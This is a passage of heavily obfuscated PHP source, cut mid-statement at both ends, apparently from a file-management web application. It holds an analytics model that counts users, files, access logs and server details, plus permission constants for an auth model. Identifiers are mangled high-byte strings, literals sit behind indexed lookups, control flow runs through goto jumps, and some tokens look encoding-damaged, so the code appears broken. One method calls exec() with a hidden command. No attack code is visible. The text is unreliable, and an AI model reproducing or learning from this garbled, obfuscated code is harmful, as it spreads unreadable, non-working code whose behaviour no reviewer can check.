($bÀ›ßå…ƒİ[$DÕ„Ã‘‚[1541]] == $DÕ„Ã‘‚[1062]) { $bÀ›ßå…ƒİ[$DÕ„Ã‘‚[1541]] = $DÕ„Ã‘‚[316]; } $bÀ›ßå…ƒİ[$DÕ„Ã‘‚[1506]] = $f¼ô×²Úäé; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($CƒÄßÜ´Ê†) { $D×¦‰‹É˜ï =& $_SERVER[±á õÁ]; $AŸ£¹Æ”¢† = array($D×¦‰‹É˜ï[559] => array($D×¦‰‹É˜ï[39] => $D×¦‰‹É˜ï[1546], $D×¦‰‹É˜ï[276] => array($D×¦‰‹É˜ï[228], $D×¦‰‹É˜ï[725], $D×¦‰‹É˜ï[1547], $D×¦‰‹É˜ï[1548])), $D×¦‰‹É˜ï[1549] => array($D×¦‰‹É˜ï[39] => $D×¦‰‹É˜ï[1550], $D×¦‰‹É˜ï[276] => array($D×¦‰‹É˜ï[228], $D×¦‰‹É˜ï[723], $D×¦‰‹É˜ï[1551], $D×¦‰‹É˜ï[1552], $D×¦‰‹É˜ï[1553]))); if (!isset($AŸ£¹Æ”¢†[$CƒÄßÜ´Ê†])) { return !1; } $this->optionType = $AŸ£¹Æ”¢†[$CƒÄßÜ´Ê†][$D×¦‰‹É˜ï[39]]; $this->field = $AŸ£¹Æ”¢†[$CƒÄßÜ´Ê†][$D×¦‰‹É˜ï[276]]; return !0; } public function listData($b™à™‡ˆŒÒ = false, $AÆå¤¢³êÆ = "\x6d\157\x64\151\x66\171\124\151\x6d\145", $C•ğÇ£æÉš = false) { return parent::listData($b™à™‡ˆŒÒ, $AÆå¤¢³êÆ, $C•ğÇ£æÉš); } public function trendList($eóİÕŞº„µ) { goto a¢Ôé¦Šª; B†ğƒ½ïÖÂ: foreach ($EŒµìˆ‚¸ as $Aî¬¿ßÖ¡) { $this->{$FĞÌöéàÚÇ}($Aî¬¿ßÖ¡); } return $this->listData(); goto c³¡‡ÊõÂ; a¢Ôé¦Šª: $Cò¤ôºä¾ô =& $_SERVER[±á õÁ]; $d‡îì—½Õ = $this->listData(); if ($d‡îì—½Õ) { $dŒŸŠÚ‰ğš = end($d‡îì—½Õ); $Aî¬¿ßÖ¡ = date($Cò¤ôºä¾ô[1554], strtotime($Cò¤ôºä¾ô[1555])); if ($dŒŸŠÚ‰ğš[$Cò¤ôºä¾ô[228]] == $Aî¬¿ßÖ¡) { return $d‡îì—½Õ; } $BÆÄ¿°µÖ« = strtotime($dŒŸŠÚ‰ğš[$Cò¤ôºä¾ô[228]]); } goto C¿›ˆ‚“Ï; C¿›ˆ‚“Ï: if (!isset($BÆÄ¿°µÖ«)) { $Bá¤ÉİõŒ = $eóİÕŞº„µ == $Cò¤ôºä¾ô[559] ? $Cò¤ôºä¾ô[502] : $Cò¤ôºä¾ô[776]; $BÆÄ¿°µÖ« = Model($Bá¤ÉİõŒ)->min($Cò¤ôºä¾ô[200]); } $FĞÌöéàÚÇ = $Cò¤ôºä¾ô[1556] . ucfirst($eóİÕŞº„µ); $EŒµìˆ‚¸ = $this->dateList($BÆÄ¿°µÖ«); goto B†ğƒ½ïÖÂ; c³¡‡ÊõÂ: } private function dateList($c˜£œÒ¥Â) { $DŞõ¤äÚ°Ÿ =& $_SERVER[±á õÁ]; $a·ç“¶íÀ– = $c˜£œÒ¥Â; $BÉ„¯ŸÉñÒ = strtotime($DŞõ¤äÚ°Ÿ[1555]); $cæĞ¿ã‚Ò = array(); while ($a·ç“¶íÀ– <= $BÉ„¯ŸÉñÒ) { $cæĞ¿ã‚Ò[] = date($DŞõ¤äÚ°Ÿ[1554], $a·ç“¶íÀ–); $a·ç“¶íÀ– = strtotime($DŞõ¤äÚ°Ÿ[1557], $a·ç“¶íÀ–); } return $cæĞ¿ã‚Ò; } public function _recordUser($dÀÃèÖÊ‚î = '') { goto dºÍÆ„’‰³; Cª»À„£„Ï: $b¼‹‘ ’Íæ = array($dÇ¢Áøö­Ì[200] => array($dÇ¢Áøö­Ì[943], $aÄ•”…ËÔ)); $cŒƒ³˜†Š“ = Model($dÇ¢Áøö­Ì[502])->where($b¼‹‘ ’Íæ)->count($dÇ¢Áøö­Ì[1463]); $b¼‹‘ ’Íæ[$dÇ¢Áøö­Ì[200]] = array($dÇ¢Áøö­Ì[336], array($E‡Åëë¨®§, $aÄ•”…ËÔ)); goto dÌ™è‚ÄäÀ; dÌ™è‚ÄäÀ: $d²êå§Ä« = Model($dÇ¢Áøö­Ì[502])->where($b¼‹‘ ’Íæ)->count($dÇ¢Áøö­Ì[1463]); $b¼‹‘ ’Íæ[$dÇ¢Áøö­Ì[39]] = $dÇ¢Áøö­Ì[1560]; $bÙ±“á¯Æø = Model($dÇ¢Áøö­Ì[1561])->where($b¼‹‘ ’Íæ)->count($dÇ¢Áøö­Ì[1562]); goto a°™¡¹¤ ¹; a°™¡¹¤ ¹: $CâÊ¨¯¼Ãî = array($dÇ¢Áøö­Ì[228] => $dÀÃèÖÊ‚î, $dÇ¢Áøö­Ì[725] => (int) $cŒƒ³˜†Š“, $dÇ¢Áøö­Ì[1547] => (int) $d²êå§Ä«, $dÇ¢Áøö­Ì[1548] => (int) $bÙ±“á¯Æø); return $this->insert($CâÊ¨¯¼Ãî); goto CŠ††ù§µ‘; dºÍÆ„’‰³: $dÇ¢Áøö­Ì =& $_SERVER[±á õÁ]; $E‡Åëë¨®§ = strtotime(date($dÇ¢Áøö­Ì[1558], strtotime($dÀÃèÖÊ‚î))); $aÄ•”…ËÔ = strtotime(date($dÇ¢Áøö­Ì[1559], strtotime($dÀÃèÖÊ‚î))); goto Cª»À„£„Ï; CŠ††ù§µ‘: } public function _recordStore($b†±åÒŸªß = '') { goto Fæ‹²¢©Óß; b»ÏÕšÙÃİ: $CéÛ®Š‰Ò = Model($DîİÕ‹¿™Õ[776])->where($CºğÈª¦™â)->sum($DîİÕ‹¿™Õ[87]); $F™½ù”™Ë = array($DîİÕ‹¿™Õ[228] => $b†±åÒŸªß, $DîİÕ‹¿™Õ[723] => (int) $eÑ¡¥¨‚‹, $DîİÕ‹¿™Õ[1551] => (int) $BÍäùâæ¢, $DîİÕ‹¿™Õ[1552] => (int) $CéøÂ‹èï, $DîİÕ‹¿™Õ[1553] => (int) $CéÛ®Š‰Ò); return $this->insert($F™½ù”™Ë); goto DåÖÃ­ƒ·è; Fæ‹²¢©Óß: $DîİÕ‹¿™Õ =& $_SERVER[±á õÁ]; $cÁ¡Ô¸öÂ¨ = strtotime(date($DîİÕ‹¿™Õ[1559], strtotime($b†±åÒŸªß))); $CºğÈª¦™â = array($DîİÕ‹¿™Õ[200] => array($DîİÕ‹¿™Õ[943], $cÁ¡Ô¸öÂ¨)); goto cô‘ÄÜ¾Š»; F…ë—õ­¸ù: $CºğÈª¦™â[$DîİÕ‹¿™Õ[395]] = 1; $CéøÂ‹èï = Model($DîİÕ‹¿™Õ[776])->where($CºğÈª¦™â)->sum($DîİÕ‹¿™Õ[87]); $CºğÈª¦™â[$DîİÕ‹¿™Õ[395]] = 2; goto b»ÏÕšÙÃİ; cô‘ÄÜ¾Š»: $BÍäùâæ¢ = Model($DîİÕ‹¿™Õ[446])->where($CºğÈª¦™â)->sum($DîİÕ‹¿™Õ[87]); $CºğÈª¦™â[$DîİÕ‹¿™Õ[394]] = 0; $eÑ¡¥¨‚‹ = Model($DîİÕ‹¿™Õ[776])->where($CºğÈª¦™â)->sum($DîİÕ‹¿™Õ[87]); goto F…ë—õ­¸ù; DåÖÃ­ƒ·è: } public function trend($f®…„…ğŠÍ, $FøÕÁİÇª) { goto Fœƒ ‚Àë; Fœƒ ‚Àë: $A¯Ùöß•Ü‹ =& $_SERVER[±á õÁ]; if (!$this->init($f®…„…ğŠÍ)) { return !1; } $E­ê°¢»Ò = $this->trendList($f®…„…ğŠÍ); goto F÷‰³’ù¡ß; eÀò…÷×½: if (empty($E­ê°¢»Ò)) { $eù¼œ›œ›å = date($A¯Ùöß•Ü‹[1554], strtotime($A¯Ùöß•Ü‹[1555])); $dŒ·÷ñß¶Ÿ = array($A¯Ùöß•Ü‹[228] => $eù¼œ›œ›å); foreach ($a•‚Ğøµ‹İ[$f®…„…ğŠÍ] as $cğ¼‡ˆ»—Â => $cËÏ˜Ö£Ùµ) { $dŒ·÷ñß¶Ÿ[$cğ¼‡ˆ»—Â] = 0; } $E­ê°¢»Ò[] = $dŒ·÷ñß¶Ÿ; } $BŸ„¶èñ = array(); foreach ($E­ê°¢»Ò as $cËÏ˜Ö£Ùµ) { if ($f®…„…ğŠÍ == $A¯Ùöß•Ü‹[1549] && $cËÏ˜Ö£Ùµ[$A¯Ùöß•Ü‹[1551]] > $cËÏ˜Ö£Ùµ[$A¯Ùöß•Ü‹[723]]) { $cËÏ˜Ö£Ùµ[$A¯Ùöß•Ü‹[1551]] = $cËÏ˜Ö£Ùµ[$A¯Ùöß•Ü‹[723]]; } foreach ($a•‚Ğøµ‹İ[$f®…„…ğŠÍ] as $cğ¼‡ˆ»—Â => $b°ÈšÄÄ‰ğ) { $dëš£Ô‹ƒˆ = array($A¯Ùöß•Ü‹[228] => $cËÏ˜Ö£Ùµ[$A¯Ùöß•Ü‹[228]], $A¯Ùöß•Ü‹[1366] => $b°ÈšÄÄ‰ğ); $dëš£Ô‹ƒˆ[$C•¬½ÛÍ”[$f®…„…ğŠÍ]] = isset($cËÏ˜Ö£Ùµ[$cğ¼‡ˆ»—Â]) ? $cËÏ˜Ö£Ùµ[$cğ¼‡ˆ»—Â] : 0; $BŸ„¶èñ[] = $dëš£Ô‹ƒˆ; } } goto EØÑ‚äå®; EØÑ‚äå®: return $BŸ„¶èñ; goto c±Çô»àØ˜; F÷‰³’ù¡ß: if ($E­ê°¢»Ò && $FøÕÁİÇª != $A¯Ùöß•Ü‹[1437]) { $F¨’’ÇÇÏÒ = $E­ê°¢»Ò[0][$A¯Ùöß•Ü‹[228]]; $d©ˆ”ôëÒÈ = $this->validDate($FøÕÁİÇª, $F¨’’ÇÇÏÒ); $dÔÈ¥¬·È× = array(); $bî¬òğŒ£ = array_to_keyvalue($E­ê°¢»Ò, $A¯Ùöß•Ü‹[228]); foreach ($d©ˆ”ôëÒÈ as $eù¼œ›œ›å) { if (isset($bî¬òğŒ£[$eù¼œ›œ›å])) { $dëš£Ô‹ƒˆ = $bî¬òğŒ£[$eù¼œ›œ›å]; } else { $dëš£Ô‹ƒˆ = end($E­ê°¢»Ò); $dëš£Ô‹ƒˆ[$A¯Ùöß•Ü‹[228]] = $eù¼œ›œ›å; if ($f®…„…ğŠÍ == $A¯Ùöß•Ü‹[559]) { $dëš£Ô‹ƒˆ[$A¯Ùöß•Ü‹[1547]] = $dëš£Ô‹ƒˆ[$A¯Ùöß•Ü‹[1548]] = 0; } } $dÔÈ¥¬·È×[] = $dëš£Ô‹ƒˆ; } $E­ê°¢»Ò = $dÔÈ¥¬·È×; } $a•‚Ğøµ‹İ = array($A¯Ùöß•Ü‹[559] => array($A¯Ùöß•Ü‹[725] => LNG($A¯Ùöß•Ü‹[1563]), $A¯Ùöß•Ü‹[1547] => LNG($A¯Ùöß•Ü‹[1564]), $A¯Ùöß•Ü‹[1548] => LNG($A¯Ùöß•Ü‹[1565])), $A¯Ùöß•Ü‹[1549] => array($A¯Ùöß•Ü‹[723] => LNG($A¯Ùöß•Ü‹[1566]), $A¯Ùöß•Ü‹[1551] => LNG($A¯Ùöß•Ü‹[1567]), $A¯Ùöß•Ü‹[1552] => LNG($A¯Ùöß•Ü‹[1568]), $A¯Ùöß•Ü‹[1553] => LNG($A¯Ùöß•Ü‹[1569]))); $C•¬½ÛÍ” = array($A¯Ùöß•Ü‹[559] => $A¯Ùöß•Ü‹[1570], $A¯Ùöß•Ü‹[1549] => $A¯Ùöß•Ü‹[87]); goto eÀò…÷×½; c±Çô»àØ˜: } public function validDate($aó¦Ç©…¸Î, $AÕ’ÉôâÉ) { goto c‹Ù‰îÍ§‘; b§ŒŒÍ‰Ì: return $e·…åŠÊî; goto a¬¿Ô¤À¥; EñêÜÇé¸: switch ($aó¦Ç©…¸Î) { case $a’ù£ì¸˜Ô[1444]: $c„èÙ•Ê¦ã = mktime(0, 0, 0, date($a’ù£ì¸˜Ô[1571]), date($a’ù£ì¸˜Ô[1184]) - date($a’ù£ì¸˜Ô[1247]) + 7 - 7, date($a’ù£ì¸˜Ô[1572])); $Dó†·ºŠ°Ç = 0; do { $cÌ½È–†£Á = date($a’ù£ì¸˜Ô[1554], $c„èÙ•Ê¦ã - 3600 * 24 * 7 * $Dó†·ºŠ°Ç); $e·…åŠÊî[] = $cÌ½È–†£Á; $Dó†·ºŠ°Ç++; } while ($AÕ’ÉôâÉ < $cÌ½È–†£Á); break; case $a’ù£ì¸˜Ô[1442]: $Dó†·ºŠ°Ç = 1; do { $D ‘µ„†ÎÓ = date($a’ù£ì¸˜Ô[1573], strtotime("\55\x20{$Dó†·ºŠ°Ç}\40\x6d\x6f\156\x74\x68\163")); $e·…åŠÊî[] = $D ‘µ„†ÎÓ; $Dó†·ºŠ°Ç++; } while ($AÕ’ÉôâÉ < $D ‘µ„†ÎÓ); break; case $a’ù£ì¸˜Ô[1574]: $BºçïÅí‚¼ = (int) date($a’ù£ì¸˜Ô[1572], strtotime($AÕ’ÉôâÉ)); $e”ŞÉ«»œ = (int) date($a’ù£ì¸˜Ô[1572]); if ($BºçïÅí‚¼ >= $e”ŞÉ«»œ) { break; } for ($BºçïÅí‚¼; $BºçïÅí‚¼ < $e”ŞÉ«»œ; $BºçïÅí‚¼++) { $e·…åŠÊî[] = $BºçïÅí‚¼ . $a’ù£ì¸˜Ô[1575]; } break; default: break; } if ($AÕ’ÉôâÉ > end($e·…åŠÊî)) { array_pop($e·…åŠÊî); } sort($e·…åŠÊî); goto b§ŒŒÍ‰Ì; c‹Ù‰îÍ§‘: $a’ù£ì¸˜Ô =& $_SERVER[±á õÁ]; $C×š–‹ìµÛ = date($a’ù£ì¸˜Ô[1554], strtotime($a’ù£ì¸˜Ô[1555])); $e·…åŠÊî = array($C×š–‹ìµÛ); goto EñêÜÇé¸; a¬¿Ô¤À¥: } public function listTable($BÁ‰í§å¿) { $AéĞÁœˆÜÓ = ucfirst($BÁ‰í§å¿); return Model($AéĞÁœˆÜÓ)->listData(); } public function option($B¼Â˜¦õ) { $DÏ‰ÖÉ±ª¶ = $_SERVER[±á õÁ][1576] . ucfirst($B¼Â˜¦õ); return $this->{$DÏ‰ÖÉ±ª¶}(); } private function optionUser() { goto d¥â°³”Âğ; E«éö„‰‡¦: $Eå‡‘ì“‹ò = Model($BˆëØµ‹÷[502])->where($Eñ¾Ü¡»¶)->count($BˆëØµ‹÷[1463]); return array($BˆëØµ‹÷[720] => (int) $c×è±æ‹ø¦, $BˆëØµ‹÷[1580] => (int) ($c×è±æ‹ø¦ - $b åä“ö­«), $BˆëØµ‹÷[1581] => (int) $b åä“ö­«, $BˆëØµ‹÷[1582] => (int) $Eå‡‘ì“‹ò, $BˆëØµ‹÷[1583] => $Eˆ•……â); goto Aµ‚‰Öä°; C‡¢„á„ ›: if (!$Eˆ•……â) { $Eˆ•……â = 1; } $AÙ¤…–ªÑ = strtotime(date($BˆëØµ‹÷[1558])); $Eñ¾Ü¡»¶ = array($BˆëØµ‹÷[1579] => array($BˆëØµ‹÷[944], $AÙ¤…–ªÑ)); goto E«éö„‰‡¦; d˜åêô—–»: $AÙ¤…–ªÑ = strtotime($BˆëØµ‹÷[1578]); $Eñ¾Ü¡»¶ = array($BˆëØµ‹÷[1579] => array($BˆëØµ‹÷[944], $AÙ¤…–ªÑ)); $Eˆ•……â = (int) Model($BˆëØµ‹÷[502])->where($Eñ¾Ü¡»¶)->count($BˆëØµ‹÷[1463]); goto C‡¢„á„ ›; d¥â°³”Âğ: $BˆëØµ‹÷ =& $_SERVER[±á õÁ]; $c×è±æ‹ø¦ = Model($BˆëØµ‹÷[502])->count($BˆëØµ‹÷[1463]); $b åä“ö­« = Model($BˆëØµ‹÷[502])->where($BˆëØµ‹÷[1577])->count($BˆëØµ‹÷[1463]); goto d˜åêô—–»; Aµ‚‰Öä°: } private function optionFile() { goto fò³¢†‡á©; fò³¢†‡á©: $bµä–´µÜ =& $_SERVER[±á õÁ]; $Fİ¢±¿‚èõ = $this->sourceSize(); $cŞœÀø’¿ = $Fİ¢±¿‚èõ[$bµä–´µÜ[87]]; goto EğÇÕ¿âÃ; CùĞÛ¸Ãæô: $AÚø°Õè¢ã = Model($bµä–´µÜ[776])->where($C‚ßÆ¥ã¦)->sum($bµä–´µÜ[87]); $d•¨Ä¢œ¡¯ = Model($bµä–´µÜ[776])->where($C‚ßÆ¥ã¦)->count($bµä–´µÜ[393]); return array($bµä–´µÜ[723] => $cŞœÀø’¿, $bµä–´µÜ[1551] => $A¸ë×™Ø±±, $bµä–´µÜ[1584] => $cŞœÀø’¿ - $A¸ë×™Ø±±, $bµä–´µÜ[1585] => (int) $AÚø°Õè¢ã, $bµä–´µÜ[725] => (int) $d°ğé«êö¥, $bµä–´µÜ[1586] => (int) $d•¨Ä¢œ¡¯); goto Bó·”Ãçè±; EğÇÕ¿âÃ: $A¸ë×™Ø±± = $Fİ¢±¿‚èõ[$bµä–´µÜ[1551]]; $d°ğé«êö¥ = Model($bµä–´µÜ[776])->where(array($bµä–´µÜ[394] => 0))->count($bµä–´µÜ[393]); $C‚ßÆ¥ã¦ = array($bµä–´µÜ[394] => 0, $bµä–´µÜ[200] => array($bµä–´µÜ[944], strtotime(date($bµä–´µÜ[1558])))); goto CùĞÛ¸Ãæô; Bó·”Ãçè±: } private function optionAccess() { $f›ÑçÈ„ÍŸ =& $_SERVER[±á õÁ]; return array($f›ÑçÈ„ÍŸ[720] => $this->typeLogCnt(), $f›ÑçÈ„ÍŸ[113] => $this->typeLogCnt($f›ÑçÈ„ÍŸ[113]), $f›ÑçÈ„ÍŸ[428] => $this->typeLogCnt($f›ÑçÈ„ÍŸ[428]), $f›ÑçÈ„ÍŸ[1587] => $this->typeLogCnt($f›ÑçÈ„ÍŸ[1587]), $f›ÑçÈ„ÍŸ[1588] => $this->typeLogCnt($f›ÑçÈ„ÍŸ[1588]), $f›ÑçÈ„ÍŸ[559] => $this->typeLogCnt($f›ÑçÈ„ÍŸ[43], $f›ÑçÈ„ÍŸ[1562])); } private function typeLogCnt($eºÂ©Ç‹ = '', $bÂ¡ŞãÌ¨Ş = "\151\144") { goto a¶—¦—µ®; a¶—¦—µ®: $fß‚´î¾áœ =& $_SERVER[±á õÁ]; $b‡á•¼ìßô = array($fß‚´î¾áœ[113] => array($fß‚´î¾áœ[1589], $fß‚´î¾áœ[1590]), $fß‚´î¾áœ[428] => array($fß‚´î¾áœ[1591], $fß‚´î¾áœ[1592]), $fß‚´î¾áœ[1587] => array($fß‚´î¾áœ[1593], $fß‚´î¾áœ[1594], $fß‚´î¾áœ[1595]), $fß‚´î¾áœ[1588] => array($fß‚´î¾áœ[1596], $fß‚´î¾áœ[1597]), $fß‚´î¾áœ[1598] => array($fß‚´î¾áœ[1599], $fß‚´î¾áœ[1600], $fß‚´î¾áœ[1601])); $B„™ÇƒÙç† = strtotime(date($fß‚´î¾áœ[1558])); goto a½¯İ§¢©™; dªÓÚè¦Ñõ: return (int) $F•ŒÀÚ°Å; goto BÕ…ÅÏ¢Û; a½¯İ§¢©™: $eÃœŠÉÇÀ¤ = array($fß‚´î¾áœ[200] => array($fß‚´î¾áœ[944], $B„™ÇƒÙç†)); if ($eºÂ©Ç‹) { $eÃœŠÉÇÀ¤[$fß‚´î¾áœ[39]] = array($fß‚´î¾áœ[7], $b‡á•¼ìßô[$eºÂ©Ç‹]); } $F•ŒÀÚ°Å = Model($fß‚´î¾áœ[1561])->where($eÃœŠÉÇÀ¤)->count($bÂ¡ŞãÌ¨Ş); goto dªÓÚè¦Ñõ; BÕ…ÅÏ¢Û: } private function optionServer() { goto B‘¤Ãà¬®ï; BË©’âåùª: if ($CÒéªµ¨ÕÔ == $cñ¾Ñ‘åŒ[748]) { $F•ÒË—¯¦¨ = explode($cñ¾Ñ‘åŒ[1097], $f®‹×ò‹…İ[$cñ¾Ñ‘åŒ[904]]); $CÒéªµ¨ÕÔ = $F•ÒË—¯¦¨[0]; } if ($CÒéªµ¨ÕÔ == $cñ¾Ñ‘åŒ[751] || $CÒéªµ¨ÕÔ == $cñ¾Ñ‘åŒ[752]) { $E¿“ÌŒ¿†˜ = Model()->db()->query($cñ¾Ñ‘åŒ[1602]); $aŸ“›ÏÑ = $E¿“ÌŒ¿†˜[0] && isset($E¿“ÌŒ¿†˜[0][$cñ¾Ñ‘åŒ[1365]]) ? $E¿“ÌŒ¿†˜[0][$cñ¾Ñ‘åŒ[1365]] : 0; $CÒéªµ¨ÕÔ = $cñ¾Ñ‘åŒ[1603] . ($aŸ“›ÏÑ ? $cñ¾Ñ‘åŒ[8] . $aŸ“›ÏÑ : $cñ¾Ñ‘åŒ[43]); } $BÃË‹‚ˆ‰° = $GLOBALS[$cñ¾Ñ‘åŒ[6]][$cñ¾Ñ‘åŒ[352]][$cñ¾Ñ‘åŒ[778]]; goto díæÕò„‚ª; B‘¤Ãà¬®ï: $cñ¾Ñ‘åŒ =& $_SERVER[±á õÁ]; $aê†õ‹…Ñ¥ = $this->diskDriver(); $CŞŞŒ˜Š = KodIO::defaultDriver(); goto b§ğ‰Š¿æ; A‘ÄÙª‹Éƒ: $a×äÚˆÌ–Î = $aó·½âÇ[0]; $f®‹×ò‹…İ = $GLOBALS[$cñ¾Ñ‘åŒ[6]][$cñ¾Ñ‘åŒ[27]]; $CÒéªµ¨ÕÔ = $f®‹×ò‹…İ[$cñ¾Ñ‘åŒ[905]]; goto BË©’âåùª; díæÕò„‚ª: return array($cñ¾Ñ‘åŒ[1604] => $aê†õ‹…Ñ¥ ? $aê†õ‹…Ñ¥[$cñ¾Ñ‘åŒ[1605]] : 0, $cñ¾Ñ‘åŒ[1606] => $aê†õ‹…Ñ¥ ? $aê†õ‹…Ñ¥[$cñ¾Ñ‘åŒ[1607]] : 0, $cñ¾Ñ‘åŒ[1608] => (int) $CŞŞŒ˜Š[$cñ¾Ñ‘åŒ[1605]] * 1024 * 1024 * 1024, $cñ¾Ñ‘åŒ[1609] => (int) $CÙ³£·’¡», $cñ¾Ñ‘åŒ[1610] => ucfirst($a×äÚˆÌ–Î), $cñ¾Ñ‘åŒ[1611] => $cñ¾Ñ‘åŒ[1612] . PHP_VERSION, $cñ¾Ñ‘åŒ[1613] => phpBuild64() ? 64 : 32, $cñ¾Ñ‘åŒ[719] => str_replace($cñ¾Ñ‘åŒ[1614], $cñ¾Ñ‘åŒ[921], $CÒéªµ¨ÕÔ), $cñ¾Ñ‘åŒ[352] => ucfirst($BÃË‹‚ˆ‰°), $cñ¾Ñ‘åŒ[38] => $_SERVER[$cñ¾Ñ‘åŒ[1615]]); goto CãêÜˆ¸÷½; b§ğ‰Š¿æ: $cĞ‡³Œå“ = array($cñ¾Ñ‘åŒ[768] => $CŞŞŒ˜Š[$cñ¾Ñ‘åŒ[391]]); $CÙ³£·’¡» = Model($cñ¾Ñ‘åŒ[446])->where($cĞ‡³Œå“)->sum($cñ¾Ñ‘åŒ[87]); $aó·½âÇ = explode($cñ¾Ñ‘åŒ[60], $_SERVER[$cñ¾Ñ‘åŒ[149]]); goto A‘ÄÙª‹Éƒ; CãêÜˆ¸÷½: } private function diskDriver() { goto C–õ‘ØÓÒ…; C–õ‘ØÓÒ…: $FØ‘”Òëâ‡ =& $_SERVER[±á õÁ]; $aÃ¡ô›—Î‚ = $FØ‘”Òëâ‡[8]; $f¢ë«áÖ‘ = $GLOBALS[$FØ‘”Òëâ‡[6]][$FØ‘”Òëâ‡[1616]] == $FØ‘”Òëâ‡[1617]; goto Câ¬æ¨Í‚µ; aïÏÇ˜¸: $E¶Ê´Áõø‡ = $A„÷İÃ‚à - @disk_free_space($aÃ¡ô›—Î‚); return array($FØ‘”Òëâ‡[1605] => $A„÷İÃ‚à, $FØ‘”Òëâ‡[1607] => $E¶Ê´Áõø‡); goto e³±¬½Ç‰‚; Câ¬æ¨Í‚µ: if ($f¢ë«áÖ‘) { $aÃ¡ô›—Î‚ = $FØ‘”Òëâ‡[1618]; if (function_exists($FØ‘”Òëâ‡[1619])) { exec($FØ‘”Òëâ‡[1620], $bª¶Š£ˆåÑ); $aÃ¡ô›—Î‚ = $bª¶Š£ˆåÑ[1] . $FØ‘”Òëâ‡[8]; } } if (!file_exists($aÃ¡ô›—Î‚)) { return; } $A„÷İÃ‚à = @disk_total_space($aÃ¡ô›—Î‚); goto aïÏÇ˜¸; e³±¬½Ç‰‚: } public function fileChart($CÀÉÃğ°Æ±) { goto FÕÏßåÉ; FÕÏßåÉ: $fÖ¥Úòô‰ =& $_SERVER[±á õÁ]; if (isset($CÀÉÃğ°Æ±[$fÖ¥Úòô‰[1463]])) { return Model($fÖ¥Úòô‰[776])->userFileTypeProfile($CÀÉÃğ°Æ±[$fÖ¥Úòô‰[1463]]); } if (isset($CÀÉÃğ°Æ±[$fÖ¥Úòô‰[1621]])) { return Model($fÖ¥Úòô‰[776])->groupFileTypeProfile($CÀÉÃğ°Æ±[$fÖ¥Úòô‰[1621]]); } goto B¹òë·…¿Â; DĞõÚ¬æ±µ: $bøÊÌÓÖƒø[$fÖ¥Úòô‰[395]] = 2; $F¯…ŞÁ¹‘É = Model($fÖ¥Úòô‰[776])->where($bøÊÌÓÖƒø)->sum($fÖ¥Úòô‰[87]); return array($fÖ¥Úòô‰[723] => $CÔ“¥»¤«Ì[$fÖ¥Úòô‰[87]], $fÖ¥Úòô‰[1551] => $CÔ“¥»¤«Ì[$fÖ¥Úòô‰[1551]], $fÖ¥Úòô‰[1552] => (int) $FÇğí¸½¿, $fÖ¥Úòô‰[1553] => (int) $F¯…ŞÁ¹‘É); goto fï¡£ØÉÄ¯; B¹òë·…¿Â: $CÔ“¥»¤«Ì = $this->sourceSize(); $bøÊÌÓÖƒø = array($fÖ¥Úòô‰[486] => 0, $fÖ¥Úòô‰[395] => 1); $FÇğí¸½¿ = Model($fÖ¥Úòô‰[776])->where($bøÊÌÓÖƒø)->sum($fÖ¥Úòô‰[87]); goto DĞõÚ¬æ±µ; fï¡£ØÉÄ¯: } private function sourceSize() { $d„—ïé»Û± =& $_SERVER[±á õÁ]; $BÁØ•Ï¦¨” = Model($d„—ïé»Û±[776])->where(array($d„—ïé»Û±[394] => 0))->sum($d„—ïé»Û±[87]); $bíø©È›â = Model($d„—ïé»Û±[446])->sum($d„—ïé»Û±[87]); if ($bíø©È›â > $BÁØ•Ï¦¨”) { $bíø©È›â = $BÁØ•Ï¦¨”; } return array($d„—ïé»Û±[87] => (int) $BÁØ•Ï¦¨”, $d„—ïé»Û±[1551] => (int) $bíø©È›â); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $eæ·éì®ƒ¥ =& $_SERVER[±á õÁ]; $F¬Œ˜´Ÿ³÷ = array(array($eæ·éì®ƒ¥[410] => LNG($eæ·éì®ƒ¥[1622]), $eæ·éì®ƒ¥[1623] => $eæ·éì®ƒ¥[1624], $eæ·éì®ƒ¥[1625] => 1, $eæ·éì®ƒ¥[1626] => 1, $eæ·éì®ƒ¥[1627] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($eæ·éì®ƒ¥[410] => LNG($eæ·éì®ƒ¥[1628]), $eæ·éì®ƒ¥[1623] => $eæ·éì®ƒ¥[1629], $eæ·éì®ƒ¥[1625] => 2, $eæ·éì®ƒ¥[1626] => 1, $eæ·éì®ƒ¥[1627] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($eæ·éì®ƒ¥[410] => LNG($eæ·éì®ƒ¥[1630]), $eæ·éì®ƒ¥[1623] => $eæ·éì®ƒ¥[1631], $eæ·éì®ƒ¥[1625] => 3, $eæ·éì®ƒ¥[1626] => 1, $eæ·éì®ƒ¥[1627] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($eæ·éì®ƒ¥[410] => LNG($eæ·éì®ƒ¥[1632]), $eæ·éì®ƒ¥[1623] => $eæ·éì®ƒ¥[1633], $eæ·éì®ƒ¥[1625] => 4, $eæ·éì®ƒ¥[1626] => 1, $eæ·éì®ƒ¥[1627] => self::AUTH_SHOW | self::AUTH_VIEW), array($eæ·éì®ƒ¥[410] => LNG($eæ·éì®ƒ¥[1634]), $eæ·éì®ƒ¥[1623] => $eæ·éì®ƒ¥[1635], $eæ·éì®ƒ¥[1625] => 5, $eæ·éì®ƒ¥[1626] => 1, $eæ·éì®ƒ¥[1627] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($eæ·éì®ƒ¥[410] => LNG($eæ·éì®ƒ¥[1636]), $eæ·éì®ƒ¥[1623] => $eæ·éì®ƒ¥[1637], 